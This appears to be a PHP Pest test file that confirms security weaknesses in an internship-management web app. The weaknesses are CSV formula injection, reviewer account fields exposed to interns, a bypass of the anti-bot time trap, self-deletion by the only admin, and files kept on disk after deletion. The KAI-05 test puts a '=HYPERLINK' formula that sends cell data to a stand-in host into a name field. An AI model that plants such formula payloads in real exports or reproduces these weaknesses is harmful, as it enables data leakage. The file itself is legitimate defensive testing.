<?php

/*
|--------------------------------------------------------------------------
| WP-4 Phase 2 — backend candidates (KAI-05..KAI-14)
|--------------------------------------------------------------------------
| Additive validation tests. No application code is modified.
*/

use App\Models\Company;
use App\Models\DocumentType;
use App\Models\InternApplication;
use App\Models\InternDocument;
use App\Models\InternDocumentReviewEvent;
use App\Models\InternRegistrationLink;
use App\Models\User;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Str;

beforeEach(function () {
    config(['sanctum.stateful' => ['localhost']]);
    $this->withHeader('Origin', 'http://localhost')
        ->withHeader('Accept', 'application/json');
    Storage::fake('local');
});

it('KAI-05: a formula survives into the CSV export cell unneutralised', function () {
    $admin = User::factory()->admin()->create();
    $user = User::factory()->intern()->create([
        'first_name' => '=HYPERLINK("http://example.test/?"&A1,"x")',
        'last_name' => 'Synthetic',
    ]);
    apiCreateIntern($user);

    $response = $this->actingAs($admin)->get('/api/v1/reports/export/interns')->assertOk();
    $csv = $response->streamedContent();

    $rows = array_map('str_getcsv', preg_split('/\r\n|\n/', trim($csv)));
    $names = array_map(fn ($row) => $row[0] ?? '', $rows);

    expect(collect($names)->contains(fn ($name) => str_starts_with((string) $name, '=HYPERLINK')))->toBeTrue();

    // Same writer path is used by the hours report: confirm the pattern there too.
    $hours = $this->actingAs($admin)->get('/api/v1/reports/export/intern-hours')->assertOk()->streamedContent();
    expect($hours)->toContain('=HYPERLINK');
});

it('SEC-07 requires current_password on forced change when no change is pending', function () {
    $user = User::factory()->admin()->create([
        'password' => 'password',
        'must_change_password' => false,
    ]);

    // Without current_password: rejected.
    $this->actingAs($user)
        ->postJson('/api/v1/auth/force-password-change', [
            'password' => 'Str0ng!Passw0rd',
            'password_confirmation' => 'Str0ng!Passw0rd',
        ])
        ->assertStatus(422)
        ->assertJsonValidationErrors('current_password');

    expect(Hash::check('password', $user->fresh()->password))->toBeTrue();

    // With current_password: accepted.
    $this->actingAs($user)
        ->postJson('/api/v1/auth/force-password-change', [
            'current_password' => 'password',
            'password' => 'Str0ng!Passw0rd',
            'password_confirmation' => 'Str0ng!Passw0rd',
        ])
        ->assertOk();

    expect(Hash::check('Str0ng!Passw0rd', $user->fresh()->password))->toBeTrue()
        ->and($user->fresh()->must_change_password)->toBeFalse();
});

it('KAI-08: an intern sees the reviewer account fields on their own documents', function () {
    $internUser = User::factory()->intern()->create();
    $intern = apiCreateIntern($internUser);
    $peso = User::factory()->pesoManager()->create([
        'email' => 'reviewer.identity@example.test',
        'must_change_password' => true,
    ]);
    $type = apiInternDocumentType('AR');

    InternDocument::create([
        'intern_id' => $intern->id,
        'document_type_id' => $type->id,
        'uploaded_by' => $internUser->id,
        'file_path' => 'intern-docs/'.$intern->id.'/evidence.pdf',
        'original_filename' => 'evidence.pdf',
        'system_filename' => 'INT-'.$intern->id.'_AR_20260101000000.pdf',
        'mime_type' => 'application/pdf',
        'status' => 'active',
        'review_status' => InternDocument::STATUS_APPROVED,
        'reviewed_by' => $peso->id,
        'reviewed_at' => now(),
    ]);

    $response = $this->actingAs($internUser)
        ->getJson('/api/v1/my-internship/201-files')
        ->assertOk();

    $reviewer = $response->json('documents.0.reviewer');

    expect($reviewer)->not->toBeNull()
        ->and($reviewer['email'])->toBe('reviewer.identity@example.test')
        ->and(array_keys($reviewer))->toContain('must_change_password')
        ->and(array_keys($reviewer))->toContain('is_active')
        ->and(array_keys($reviewer))->toContain('last_active_at');

    // credential_email_error lives on the staff-only application payload.
    $this->actingAs($internUser)->getJson('/api/v1/intern-applications')->assertForbidden();
});

it('KAI-09: an admin non-DTR upload with hours credits rendered_hours immediately', function () {
    $admin = User::factory()->admin()->create();
    $internUser = User::factory()->intern()->create();
    $intern = apiCreateIntern($internUser);
    $type = apiInternDocumentType('AR');

    expect((float) $intern->fresh()->rendered_hours)->toBe(0.0);

    $this->actingAs($admin)
        ->post('/api/v1/intern-documents', [
            'intern_id' => $intern->id,
            'document_type_id' => $type->id,
            'hours' => 10,
            'file' => UploadedFile::fake()->create('ar.pdf', 8, 'application/pdf'),
        ])
        ->assertCreated();

    expect((float) $intern->fresh()->rendered_hours)->toBe(10.0);

    $document = InternDocument::query()->firstOrFail();
    expect($document->review_status)->toBe(InternDocument::STATUS_PENDING_PESO);

    $events = InternDocumentReviewEvent::query()
        ->where('document_id', $document->id)
        ->get();

    expect($events)->toHaveCount(1)
        ->and($events->first()->action)->toBe('uploaded')
        ->and(json_encode($events->first()->metadata))->not->toContain('"hours"');
});

it('KAI-11: a public application accepts an inactive, non-partner company id', function () {
    $peso = User::factory()->pesoManager()->create();
    $link = InternRegistrationLink::create([
        'token' => Str::random(64),
        'created_by' => $peso->id,
        'expires_at' => now()->addDay(),
    ]);

    $company = Company::create([
        'name' => 'Dormant Non-Partner Co',
        'code' => 'DORM01',
        'is_active' => false,
        'is_partner_agency' => false,
    ]);

    $email = 'agency.'.Str::lower(Str::random(6)).'@example.test';

    $this->postJson("/api/v1/public/registration/{$link->token}/applications", [
        'first_name' => 'Agency',
        'last_name' => 'Probe',
        'email' => $email,
        'partner_agency_id' => $company->id,
        'consent' => true,
        'form_started_at' => (int) floor(microtime(true) * 1000) - 5000,
    ])->assertCreated();

    $application = InternApplication::query()->where('email', $email)->firstOrFail();

    expect((int) $application->partner_agency_id)->toBe((int) $company->id)
        ->and($application->status)->toBe('pending');
});

it('KAI-12: omitting form_started_at bypasses the time trap', function () {
    $peso = User::factory()->pesoManager()->create();
    $link = InternRegistrationLink::create([
        'token' => Str::random(64),
        'created_by' => $peso->id,
        'expires_at' => now()->addDay(),
    ]);

    $base = [
        'first_name' => 'Trap',
        'last_name' => 'Probe',
        'consent' => true,
    ];

    // No form_started_at at all: accepted.
    $this->postJson("/api/v1/public/registration/{$link->token}/applications", $base + [
        'email' => 'trap.none.'.Str::lower(Str::random(5)).'@example.test',
    ])->assertCreated();

    // Instant submission with form_started_at: rejected by the trap.
    $this->postJson("/api/v1/public/registration/{$link->token}/applications", $base + [
        'email' => 'trap.fast.'.Str::lower(Str::random(5)).'@example.test',
        'form_started_at' => (int) floor(microtime(true) * 1000),
    ])->assertStatus(422)->assertJsonValidationErrors('email');

    // Honeypot still works when the field is filled.
    $this->postJson("/api/v1/public/registration/{$link->token}/applications", $base + [
        'email' => 'trap.bot.'.Str::lower(Str::random(5)).'@example.test',
        'website' => 'http://spam.example',
    ])->assertStatus(422);
});

it('KAI-13: the only active admin can delete their own account', function () {
    $admin = User::factory()->admin()->create(['password' => 'password']);

    expect(User::query()->where('role', 'admin')->count())->toBe(1);

    $this->actingAs($admin)
        ->deleteJson('/api/v1/profile', ['password' => 'password'])
        ->assertOk();

    expect(User::query()->where('role', 'admin')->count())->toBe(0)
        ->and(User::withTrashed()->where('role', 'admin')->count())->toBe(1);
});

it('KAI-14: force-delete archives documents but leaves the stored file on disk', function () {
    $admin = User::factory()->admin()->create();
    $internUser = User::factory()->intern()->create();
    $intern = apiCreateIntern($internUser);
    $type = apiInternDocumentType('AR');

    $this->actingAs($admin)
        ->post('/api/v1/intern-documents', [
            'intern_id' => $intern->id,
            'document_type_id' => $type->id,
            'file' => UploadedFile::fake()->create('evidence.pdf', 8, 'application/pdf'),
        ])
        ->assertCreated();

    $document = InternDocument::query()->firstOrFail();
    $path = $document->file_path;

    Storage::disk('local')->assertExists($path);

    $this->actingAs($admin)
        ->deleteJson("/api/v1/interns/{$intern->id}/force-delete")
        ->assertOk();

    // The intern row is hard-deleted, the document row soft-deleted, the file kept.
    expect(\App\Models\Intern::withTrashed()->find($intern->id))->toBeNull();

    $trashed = InternDocument::withTrashed()->find($document->id);
    expect($trashed)->not->toBeNull()
        ->and($trashed->trashed())->toBeTrue();

    Storage::disk('local')->assertExists($path);
});
